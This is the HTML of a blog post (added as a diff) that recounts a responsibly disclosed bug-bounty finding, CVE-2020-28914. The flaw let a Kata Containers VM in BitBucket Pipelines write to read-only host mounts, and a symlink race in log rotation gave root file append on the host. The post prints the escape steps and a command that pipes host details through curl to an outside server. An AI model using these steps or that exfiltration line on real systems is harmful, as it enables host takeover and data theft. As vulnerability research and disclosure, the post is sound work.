@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>BitBucket Pipelines Kata Containers Virtual Machine Escape | Alex Chapman’s Blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="BitBucket Pipelines Kata Containers Virtual Machine Escape" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Atlassian ran a project on Bugcrowd looking for bugs in their proposed implementation of Kata Containers within the BitBucket Pipelines CI/CD environment. Whilst participating in this project, I identified a vulnerability in Kata Containers which could allow processes running in the Kata VM to write to supposedly read-only volume mounts. This vulnerability was fixed by the Kata Containers team and assigned CVE-2020-28914. Within the project Pipelines environment exploiting this vulnerability allowed a malicious build job to write semi-controlled data to arbitrary files on the host system as the root user. The following is an account of the discovery of this bug and an assessment of the impact of exploiting the bug in the project BitBucket Pipelines environment. Note: This post originally appeared on Bugcrowd’s blog it is re-posted here as the Bugcrowd post has suffered some format mangling and has been truncated, this appears to have occured during a blogging platform migration." />
+<meta property="og:description" content="Atlassian ran a project on Bugcrowd looking for bugs in their proposed implementation of Kata Containers within the BitBucket Pipelines CI/CD environment. Whilst participating in this project, I identified a vulnerability in Kata Containers which could allow processes running in the Kata VM to write to supposedly read-only volume mounts. This vulnerability was fixed by the Kata Containers team and assigned CVE-2020-28914. Within the project Pipelines environment exploiting this vulnerability allowed a malicious build job to write semi-controlled data to arbitrary files on the host system as the root user. The following is an account of the discovery of this bug and an assessment of the impact of exploiting the bug in the project BitBucket Pipelines environment. Note: This post originally appeared on Bugcrowd’s blog it is re-posted here as the Bugcrowd post has suffered some format mangling and has been truncated, this appears to have occured during a blogging platform migration." />
+<link rel="canonical" href="https://blog.ajxchapman.com/posts/2021/02/28/kata-containers-escape.html" />
+<meta property="og:url" content="https://blog.ajxchapman.com/posts/2021/02/28/kata-containers-escape.html" />
+<meta property="og:site_name" content="Alex Chapman’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-28T00:00:00-06:00" />
+<script type="application/ld+json">
+{"headline":"BitBucket Pipelines Kata Containers Virtual Machine Escape","dateModified":"2021-02-28T00:00:00-06:00","datePublished":"2021-02-28T00:00:00-06:00","@type":"BlogPosting","description":"Atlassian ran a project on Bugcrowd looking for bugs in their proposed implementation of Kata Containers within the BitBucket Pipelines CI/CD environment. Whilst participating in this project, I identified a vulnerability in Kata Containers which could allow processes running in the Kata VM to write to supposedly read-only volume mounts. This vulnerability was fixed by the Kata Containers team and assigned CVE-2020-28914. Within the project Pipelines environment exploiting this vulnerability allowed a malicious build job to write semi-controlled data to arbitrary files on the host system as the root user. The following is an account of the discovery of this bug and an assessment of the impact of exploiting the bug in the project BitBucket Pipelines environment. Note: This post originally appeared on Bugcrowd’s blog it is re-posted here as the Bugcrowd post has suffered some format mangling and has been truncated, this appears to have occured during a blogging platform migration.","url":"https://blog.ajxchapman.com/posts/2021/02/28/kata-containers-escape.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.ajxchapman.com/posts/2021/02/28/kata-containers-escape.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+  </head>
+  <body>
+
+      <header class="page-header" role="banner">
+        <a href="/">
+          <h1 class="project-name">Alex Chapman's Blog</h1>
+        </a>
+        <h2 class="project-tagline">A tech blog about all things Bug Bounty, security and development.
+</h2>
+        <div class="social">
+          <a href="https://twitter.com/ajxchapman" target="_blank"><img src="/assets/icons/twitter.svg"></a>
+          <a href="https://infosec.exchange/@ajxchapman" rel="me" target="_blank"><img src="/assets/icons/mastodon.svg"></a>
+          <a href="https://github.com/ajxchapman" target="_blank"><img src="/assets/icons/github.svg"></a>
+          <a href="https://hackerone.com/ajxchapman" target="_blank"><img src="/assets/icons/hackerone.svg"></a>
+          <a href="https://bugcrowd.com/ajxchapman" target="_blank"><img src="/assets/icons/bugcrowd.svg"></a>
+        </div>
+      </header>
+
+    <main id="content" class="main-content" role="main">
+      
+
+
+  
+
+  
+
+  
+
+  
+    
+    
+    
+
+
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="postheader">
+    <a href="/">Home</a>
+  </div>
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">BitBucket Pipelines Kata Containers Virtual Machine Escape</h1>
+    <p class="post-meta">
+      <time datetime="2021-02-28T00:00:00-06:00" itemprop="datePublished">
+        2021-02-28
+      </time>
+      
+        • <span itemprop="category">Containers</span>
+      
+  </header>
+  <div class="post-content" itemprop="articleBody">
+    <p>Atlassian ran a project on Bugcrowd looking for bugs in their proposed implementation of <a href="https://katacontainers.io/">Kata Containers</a> within the BitBucket Pipelines CI/CD environment. Whilst participating in this project, I identified a vulnerability in Kata Containers which could allow processes running in the Kata VM to write to supposedly read-only volume mounts. This vulnerability was fixed by the Kata Containers team and assigned <a href="https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-28914.md">CVE-2020-28914</a>. Within the project Pipelines environment exploiting this vulnerability allowed a malicious build job to write semi-controlled data to arbitrary files on the host system as the <code class="highlighter-rouge">root</code> user.</p>
+
+<p>The following is an account of the discovery of this bug and an assessment of the impact of exploiting the bug in the project BitBucket Pipelines environment.</p>
+
+<p><em>Note: This post originally appeared on <a href="https://www.bugcrowd.com/blog/big-bugs-cve-2020-28914/">Bugcrowd’s blog</a> it is re-posted here as the Bugcrowd post has suffered some format mangling and has been truncated, this appears to have occured during a blogging platform migration.</em></p>
+
+<!--more-->
+
+<h2 id="introduction">Introduction</h2>
+
+<p>BitBucket Pipelines is a CI/CD environment which runs build jobs from BitBucket repositories. Atlassian were trialing a new Pipelines build environment which used Kata Containers to attempt to logically separate the build jobs of different users. Kata Containers is an implementation of a CRI compatible container runtime which executes containers via Containerd within individual QEMU Virtual Machines (VMs). The goal of this new environment was to provide a higher level of security and separation than regular containerization in the event of a malicious build job escaping a build container.</p>
+
+<p>In the new BitBucket Pipelines environment build jobs were executed as Kubernetes Pods with Kata Containers configured as the container runtime, causing each build job to be executed within separate Kata VMs.</p>
+
+<figure class="image">
+  <img src="https://blog.ajxchapman.com/assets/kata-hostPath-2021/overview.png" alt="BitBucket Pipelines environment overview" />
+  <figcaption><sup>BitBucket Pipelines environment overview</sup></figcaption>
+</figure>
+
+<p>Each build job consisted of several containers, a build container for running user provided build commands, several service containers for executing required Pipelines and build services, and a privileged Docker-in-Docker (DIND) container for executing Docker commands. All containers for an individual build job were executed in the same Kubernetes Pod within a single Kata VM.</p>
+
+<p>In this environment no build job should be able to affect the output of another build job running on the same Kubernetes node, or be able to escape the Kata VM in order to compromise the node. My goal was to attempt to disprove these assertions.</p>
+
+<h2 id="bug-hunting">Bug Hunting</h2>
+
+<h3 id="escaping-to-the-kata-vm">Escaping to the Kata VM</h3>
+
+<p>From the build container, the Docker service running in the privileged DIND container could be used to launch further privileged containers*. Using the technique I previously described in <a href="https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html">Privileged Container Escape - Control Groups release_agent</a>, the container environment could be escaped, permitting command execution as the <code class="highlighter-rouge">root</code> user directly within the Kata VM. Whilst this was not a vulnerability as such, it was an important stepping stone to assist in finding bugs in the rest of the environment.</p>
+
+<p>* <em>It should be noted that BitBucket Pipelines in production implements a Docker authorization plugin to prevent arbitrary Docker commands being run within the privileged DIND container, but for this project assessment that plugin was disabled.</em></p>
+
+<h3 id="kata-containers-hostpath-vulnerability-discovery">Kata Containers ‘hostPath’ vulnerability discovery</h3>
+
+<p>Within the build container volume mounts could be discovered through the mounted file systems. In investigating the mounted paths I noticed several <code class="highlighter-rouge">kataShared</code> mounts:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@buildcont<span class="nv">$ </span>mount
+...
+kataShared on /etc/hostname <span class="nb">type </span>9p <span class="o">(</span>rw,dirsync,nodev,relatime,mmap,access<span class="o">=</span>client,trans<span class="o">=</span>virtio<span class="o">)</span>
+kataShared on /dev/termination-log <span class="nb">type </span>9p <span class="o">(</span>rw,dirsync,nodev,relatime,mmap,access<span class="o">=</span>client,trans<span class="o">=</span>virtio<span class="o">)</span>
+kataShared on /etc/hosts <span class="nb">type </span>9p <span class="o">(</span>rw,dirsync,nodev,relatime,mmap,access<span class="o">=</span>client,trans<span class="o">=</span>virtio<span class="o">)</span>
+kataShared on /etc/resolv.conf <span class="nb">type </span>9p <span class="o">(</span>rw,dirsync,nodev,relatime,mmap,access<span class="o">=</span>client,trans<span class="o">=</span>virtio<span class="o">)</span>
+kataShared on /usr/bin/docker <span class="nb">type </span>9p <span class="o">(</span>ro,dirsync,relatime,mmap,access<span class="o">=</span>client,trans<span class="o">=</span>virtio<span class="o">)</span>
+...
+</code></pre></div></div>
+<p><sup><em>Output truncated for readability.</em></sup></p>
+
+<p>Reading the Kata Containers documentation I discovered that these mounts were <code class="highlighter-rouge">hostPath</code> volumes from the container host via the Plan 9 Filesystem Protocol (9p). <code class="highlighter-rouge">hostPath</code> volumes mount paths from the container host directly into the container.</p>
+
+<p>One of the mounted paths looked particularly interesting, <code class="highlighter-rouge">/usr/bin/docker</code>. The build container was configured to have the Docker client binary <code class="highlighter-rouge">hostPath</code> mounted from the container host. I believe that this was a convenience to ensure that no matter what base image was used for the build container (the base image is user configurable), it would be able to access the DIND service without having to manually install the Docker client.</p>
+
+<p>From the <code class="highlighter-rouge">mount</code> output it could be clearly seen that the <code class="highlighter-rouge">/usr/bin/docker</code> path was mounted read-only, and any attempt to write to this path would be denied by the Kernel.</p>
+
+<p>Checking the mount points from the Kata VM showed that individual container mount points were not visible, only a single ‘parent’ mount point existed.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@katavm<span class="nv">$ </span>mount 
+...
+kataShared on /run/kata-containers/shared/containers <span class="nb">type </span>9p <span class="o">(</span>rw,nodev,relatime,dirsync,mmap,access<span class="o">=</span>client,trans<span class="o">=</span>virtio<span class="o">)</span>
+...
+</code></pre></div></div>
+<p><sup><em>Output truncated for readability.</em></sup></p>
+
+<p>Under this path however, the individual container mounts were present as files and directories:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@katavm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /run/kata-containers/shared/containers
+...
+<span class="nt">-rw-r--r--</span>  1 root root       43 Oct 26 11:47 6f727...b39fb-hostname
+<span class="nt">-rw-rw-rw-</span>  1 root root        0 Oct 26 11:47 6f727...7097c-termination-log
+<span class="nt">-rw-r--r--</span>  1 root root      239 Oct 26 11:47 6f727...c5e0e-hosts
+<span class="nt">-rw-r--r--</span>  1 root root       42 Oct 26 11:47 6f727...268f9-resolv.conf
+<span class="nt">-rwxr-xr-x</span>  1 root root 50683148 Jan  9  2019 6f727...4440e-docker
+...
+</code></pre></div></div>
+<p><sup><em>File names and output truncated for readability.</em></sup></p>
+
+<p>In an attempt to understand the mount process further, I set up a test Kubernetes environment on a VPS and configured Kata Containers as the container runtime. I then deployed a Pod with a read-only <code class="highlighter-rouge">hostPath</code> volume as below:</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">apps/v1</span>
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Deployment</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">build-deployment</span>
+<span class="na">spec</span><span class="pi">:</span>
+  <span class="na">selector</span><span class="pi">:</span>
+    <span class="na">matchLabels</span><span class="pi">:</span>
+      <span class="na">app</span><span class="pi">:</span> <span class="s">build</span>
+  <span class="na">template</span><span class="pi">:</span>
+    <span class="na">metadata</span><span class="pi">:</span>
+      <span class="na">labels</span><span class="pi">:</span>
+        <span class="na">app</span><span class="pi">:</span> <span class="s">build</span>
+    <span class="na">spec</span><span class="pi">:</span>
+      <span class="na">runtimeClassName</span><span class="pi">:</span> <span class="s">kata</span>
+      <span class="na">containers</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">build</span>
+        <span class="na">image</span><span class="pi">:</span> <span class="s">alpine:latest</span>
+        <span class="na">command</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">tail"</span><span class="pi">]</span>
+        <span class="na">args</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">-f"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">/dev/null"</span><span class="pi">]</span>
+        <span class="na">volumeMounts</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/usr/bin/docker</span>
+          <span class="na">name</span><span class="pi">:</span> <span class="s">docker</span>
+          <span class="na">readOnly</span><span class="pi">:</span> <span class="no">true</span>
+      <span class="na">volumes</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">docker</span>
+        <span class="na">hostPath</span><span class="pi">:</span>
+          <span class="na">path</span><span class="pi">:</span> <span class="s">/opt/docker/bin/docker</span>
+</code></pre></div></div>
+
+<p>Assessing the test environment I discovered that container <code class="highlighter-rouge">hostPath</code> volumes followed a somewhat complicated mounting chain from the host to the target container, this is outlined below:</p>
+<ol>
+  <li>The source mount path was <code class="highlighter-rouge">bind</code> mounted into the target Kata VM share directory on the container host (<code class="highlighter-rouge">/run/kata-containers/shared/sandboxes/&lt;KataVM_ID&gt;/shared/</code>).</li>
+  <li>The Kata VM share directory was shared over a <code class="highlighter-rouge">virtio-9p-pci</code> device into the target Kata VM.</li>
+  <li>Within the Kata VM the <code class="highlighter-rouge">virtio</code> device was mounted to the container share directory (<code class="highlighter-rouge">/run/kata-containers/shared/containers</code>).</li>
+  <li>The mount path was <code class="highlighter-rouge">bind</code> mounted from the container share directory into the destination container.</li>
+</ol>
+
+<p>At this point I noted something odd:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@host<span class="nv">$ </span>mount
+...
+/dev/vda1 on /run/kata-containers/shared/sandboxes/9619d...b411d/shared/7277c...f78c0-docker <span class="nb">type </span>ext4 <span class="o">(</span>rw,relatime<span class="o">)</span>
+...
+root@host<span class="nv">$ </span><span class="nb">cat</span> /proc/self/mountinfo
+...
+3196 2875 252:1 /opt/docker/bin/docker /run/kata-containers/shared/sandboxes/9619d...b411d/shared/7277c...f78c0-docker rw,relatime master:1 - ext4 /dev/vda1 rw
+...
+</code></pre></div></div>
+<p><sup><em>File names and output truncated for readability.</em></sup></p>
+
+<p>The output above shows that even though the <code class="highlighter-rouge">docker</code> mount was configured as read-only in the Pod YAML, it was bind mounted read-write into the Kata VM share directory. Despite this, it was ultimately being mounted read-only within the destination container. This implied that the read-only protection was being applied from within the Kata VM, meaning that the mount source could potentially be modified by commands running directly in the Kata VM.</p>
+
+<p>Since command execution within the Kata VM had already been obtained (see section ‘Escaping to the Kata VM’ above), I tested this by writing to the supposedly read-only <code class="highlighter-rouge">docker</code> binary.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@katavm<span class="nv">$ </span><span class="nb">echo </span>1 <span class="o">&gt;</span> /run/kata-containers/shared/containers/7277c...f78c0-docker
+</code></pre></div></div>
+<p><sup><em>File names truncated for readability.</em></sup></p>
+
+<p>The write was successful and the modified <code class="highlighter-rouge">docker</code> binary could be seen from the container host.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@host<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /opt/docker/bin/docker
+<span class="nt">-rwxr-xr-x</span>  1 root root 2 Oct 26 18:16 /opt/docker/bin/docker
+root@host<span class="nv">$ </span><span class="nb">cat</span> /opt/docker/bin/docker
+1
+</code></pre></div></div>
+
+<p>Moving back to the Pipelines environment, I confirmed I was able to modify the <code class="highlighter-rouge">docker</code> binary on the container host, and have the modified binary affect another build, <em>very cool</em>!</p>
+
+<figure class="image">
+  <img src="https://blog.ajxchapman.com/assets/kata-hostPath-2021/docker_backdoor.png" alt="BitBucket Pipelines output showing result of running the modified `docker` binary from a build job" />
+  <figcaption><sup>BitBucket Pipelines output showing result of running the modified `docker` binary from a build job</sup></figcaption>
+</figure>
+
+<p>Unfortunately through a bug in my PoC I managed to corrupt my backup of the <code class="highlighter-rouge">docker</code> binary, breaking it for all other builds run on the node, <em>very not cool</em>!</p>
+
+<p>It was here I decided to clean up as much as I could and open the initial <a href="https://bugcrowd.com/disclosures/7bf77429-2b94-44ea-b6f9-c1fc59b2fd17/host-docker-binary-overwrite-from-kata-vm">Bugcrowd report</a> stating I may have DoSed the Pipelines environment and would provide a full report as soon as possible. I got a full report written up several hours later.</p>
+
+<h2 id="impact-assessment-and-exploitation">Impact Assessment and Exploitation</h2>
+
+<p>I had identified that the <code class="highlighter-rouge">docker</code> binary which was mounted into each build container on a node could be overwritten with malicious code. This could be exploited to modify the build output of other builds on the same node, but unfortunately it did not appear that this could be exploited to escape the Kata VM and execute commands on the container host, my ultimate goal.</p>
+
+<p>Further assessment identified another read-only <code class="highlighter-rouge">hostPath</code> volume which mounted the <code class="highlighter-rouge">/var/log/pods/$(NAMESPACE_NAME)_$(POD_NAME)_$(POD_ID)</code> directory. This mount included container standard output logs for each container in the Pod. It appeared that this mount was used by an ‘agent’ container to report build and service container output to the Pipelines web UI.</p>
+
+<p>Each container in the Pod had a separate subdirectory within the log directory, with the standard output of the container being written to <code class="highlighter-rouge">0.log</code> under its subdirectory. Each line of output from the container was recorded, prepended with a time stamp, stream name and truncation status, such as below:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2020-10-29T12:49:35.410976914Z stdout F id
+2020-10-29T12:49:35.503666526Z stdout F uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<p>Looking for the <code class="highlighter-rouge">/var/log/pods</code> directory in my test environment, I quickly identified that these logs were being written by the <code class="highlighter-rouge">containerd</code> process running on the container host.</p>
+
+<p>This second mount seemed more promising for escaping the Kata VM for three reasons:</p>
+<ol>
+  <li>The source of the mount was a directory, not just a single file like the <code class="highlighter-rouge">docker</code> mount</li>
+  <li>The files in the directory were being written by a process running as the <code class="highlighter-rouge">root</code> user on the container host</li>
+  <li>The data written to the files could be at least partially controlled as it included the stdout of containers under the control of the build job</li>
+</ol>
+
+<p>As I dug further into the potential avenues of exploitation for this issue I kept the Bugcrowd report updated with the new information I was discovering.</p>
+
+<h3 id="write-primitive">Write Primitive</h3>
+
+<p>My first idea to exploit this log mount was to replace the current standard output log file for a test container with a symlink to another file, then have the container write controlled data to the standard output stream. Amazingly this worked first time, linking the <code class="highlighter-rouge">test/0.log</code> file to <code class="highlighter-rouge">test/1.log</code> resulted in the standard output stream for the ‘test’ container being written to the target <code class="highlighter-rouge">test/1.log</code> file.</p>
+
+<p>To prove the symlink destination was being written by a process on the container host (and not from within the Kata VM), I configured my test Kubernetes environment with a Pod mounting the <code class="highlighter-rouge">/var/log/pods/$(NAMESPACE_NAME)_$(POD_NAME)_$(POD_ID)</code> directory and confirmed this technique would create new files on the container host outside of the mounted log directory.</p>
+
+<p>At this point I could create any new files on the container host with <code class="highlighter-rouge">-rw-r-----</code> permissions, owned by <code class="highlighter-rouge">root:root</code> and with partially controlled data. Unfortunately however, it appeared that existing files could not be overwritten or appended to. Without the ability to append to existing files this issue would be more difficult to exploit, as the files that I could on the container host did not have ‘execute’ permissions.</p>
+
+<h3 id="append-primitive">Append Primitive</h3>
+
+<p>For some unknown reason, when symlinking <code class="highlighter-rouge">test/0.log</code> to an existing file Containerd would refuse to overwrite or append to the symlink target. This annoyed me more than it should, so I went looking through the Containerd source code on GitHub for why this might be.</p>
+
+<p>It turned out that Containerd would ignore errors when writing container standard output log lines, and had no automatic method to reopen log files on error. I discovered that the write primitive above actually worked due to the log rotation code in Kubernetes Kublet. Every 10 seconds the Kubernetes <code class="highlighter-rouge">kubelet</code> process would check the container standard output log directory for each running container. If the <code class="highlighter-rouge">0.log</code> file did not exist, Kubelet would send a gRPC request to Containerd telling it to reopen the log file. However, in the case that <code class="highlighter-rouge">0.log</code> had been symlinked to an existing file, Kublet saw the file existed and did not make the gRPC call, preventing Containerd from writing to the symlink location.</p>
+
+<p>Looking over the Kubelet log rotation code, I discovered a possibility for appending to existing files. If <code class="highlighter-rouge">0.log</code> was greater than 10MB, Kubelet would rotate <code class="highlighter-rouge">0.log</code> to <code class="highlighter-rouge">0.log.&lt;timestamp&gt;</code> and then send a gRPC request to Containerd telling it to reopen the <code class="highlighter-rouge">0.log</code> file for logging.</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">c</span> <span class="o">*</span><span class="n">containerLogManager</span><span class="p">)</span> <span class="n">rotateLatestLog</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">log</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
+	<span class="n">timestamp</span> <span class="o">:=</span> <span class="n">c</span><span class="o">.</span><span class="n">clock</span><span class="o">.</span><span class="n">Now</span><span class="p">()</span><span class="o">.</span><span class="n">Format</span><span class="p">(</span><span class="n">timestampFormat</span><span class="p">)</span>
+	<span class="n">rotated</span> <span class="o">:=</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"%s.%s"</span><span class="p">,</span> <span class="n">log</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">c</span><span class="o">.</span><span class="n">osInterface</span><span class="o">.</span><span class="n">Rename</span><span class="p">(</span><span class="n">log</span><span class="p">,</span> <span class="n">rotated</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"failed to rotate log %q to %q: %v"</span><span class="p">,</span> <span class="n">log</span><span class="p">,</span> <span class="n">rotated</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">c</span><span class="o">.</span><span class="n">runtimeService</span><span class="o">.</span><span class="n">ReopenContainerLog</span><span class="p">(</span><span class="n">id</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+</code></pre></div></div>
+<p><sup><a href="https://github.com/kubernetes/kubernetes/blob/bb376f161640529f600203faee4cd0de8ec16778/pkg/kubelet/logs/container_log_manager.go#L401">https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/logs/container_log_manager.go</a></sup></p>
+
+<p>This non-atomic operation across two processes contains a relatively simple race condition. If, after Kubelet has rotated <code class="highlighter-rouge">0.log</code> but before Containerd has reopend <code class="highlighter-rouge">0.log</code>, <code class="highlighter-rouge">0.log</code> is created as a symlink to an existing file, Containerd will happily open the symlink destination and append all future log lines.</p>
+
+<p><em>Aside:</em> There is also a way to exploit the Kubelet log rotation behaviour to read files from the container host, but the details of this are left to be discovered by the reader.</p>
+
+<h3 id="exploitation-or-lack-thereof">Exploitation (or lack thereof)</h3>
+
+<p>Now with the ability to append to arbitrary files on the container host, my plan was to identify a shell script likely to exist and append lines which would execute arbitrary shell commands. For example, executing the following in a container:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'Run command \\$({ hostname; id; uname -a; } 2&gt;&amp;1 | curl -T - http://debug.webhooks.pw/log)'</span>
+</code></pre></div></div>
+
+<p>Would result in the following lines being appended to the target shell script:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2020-11-02T08:43:34.846940623Z stdout F + <span class="nb">echo</span> <span class="s1">'Run command \\$({ hostname; id; uname -a; } 2&gt;&amp;1 | curl -T - http://debug.webhooks.pw/log)'</span>
+2020-11-02T08:43:34.846946507Z stdout F Run <span class="nb">command</span> <span class="se">\\</span><span class="si">$(</span><span class="o">{</span> <span class="nb">hostname</span><span class="p">;</span> <span class="nb">id</span><span class="p">;</span> <span class="nb">uname</span> <span class="nt">-a</span><span class="p">;</span> <span class="o">}</span> 2&gt;&amp;1 | curl <span class="nt">-T</span> - http://debug.webhooks.pw/log<span class="si">)</span>
+</code></pre></div></div>
+
+<p>When executed from a <code class="highlighter-rouge">bash</code> or <code class="highlighter-rouge">sh</code> shell, the sub command <code class="highlighter-rouge">{ hostname; id; uname -a; } 2&gt;&amp;1 | curl -T - http://debug.webhooks.pw/log</code> would be executed, which would record the output of the <code class="highlighter-rouge">hostname</code>, <code class="highlighter-rouge">id</code> and <code class="highlighter-rouge">uname -a</code> commands to a webserver under my control. (Since sub-commands are evaluated before the ‘main’ command on a line in a shell script, it did not matter that the ‘main’ command, <code class="highlighter-rouge">2020-11-02T08:43:34.846946507Z</code> in this instance, was not a valid shell command.)</p>
+
+<p>Unfortunately between the time of the initial report and the Kata Containers fix being applied in the Pipelines environment I was unable to identify a suitable target shell script to write to on the container host. Ultimately however, the BitBucket team assessed the updated details provided and concluded that this issue could likely be exploited to execute commands on the container host as the <code class="highlighter-rouge">root</code> user. Whilst this was a slightly disappointing end to this journey, I was happy with the response from the BitBucket team.</p>
+
+<h2 id="timeline">Timeline</h2>
+
+<ul>
+  <li><strong>20201026</strong> - Initial Report</li>
+  <li><strong>20201028</strong> - Atlassian confirmed vulnerability</li>
+  <li><strong>20201030</strong> - Atlassian created bug report against Kata Containers project</li>
+  <li><strong>20201030</strong> - Further information provided</li>
+  <li><strong>20201106</strong> - Kata Containers PR merged</li>
+  <li><strong>20201112</strong> - Kata Containers fix released</li>
+  <li><strong>20201117</strong> - CVE-2020-28914 assigned</li>
+  <li><strong>20201118</strong> - Atlassian implemented fix</li>
+</ul>
+
+<h2 id="thanks">Thanks</h2>
+
+<p>I want to thank both the Atlassian BitBucket and the Kata Containers teams for their quick responses to this issue.</p>
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li>Original Bugcrowd report: <a href="https://bugcrowd.com/disclosures/7bf77429-2b94-44ea-b6f9-c1fc59b2fd17/host-docker-binary-overwrite-from-kata-vm">https://bugcrowd.com/disclosures/7bf77429-2b94-44ea-b6f9-c1fc59b2fd17/host-docker-binary-overwrite-from-kata-vm</a></li>
+  <li>CVE-2020-28914 details: <a href="https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-28914.md">https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-28914.md</a></li>
+  <li>GitHub Issue: <a href="https://github.com/kata-containers/runtime/issues/3036">https://github.com/kata-containers/runtime/issues/3036</a></li>
+  <li>GitHub Fix PR: <a href="https://github.com/kata-containers/kata-containers/pull/1062">https://github.com/kata-containers/kata-containers/pull/1062</a></li>
+  <li>Kata Containers release with fix: <a href="https://github.com/kata-containers/runtime/releases/tag/1.11.5">https://github.com/kata-containers/runtime/releases/tag/1.11.5</a></li>
+</ul>
+
+  </div>
+
+  <div class="postfooter">
+    <a href="/">Home</a>
+    
+      <a href="/containers/index.html">More Containers posts</a>
+    
+  </div>
+</article>
+
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
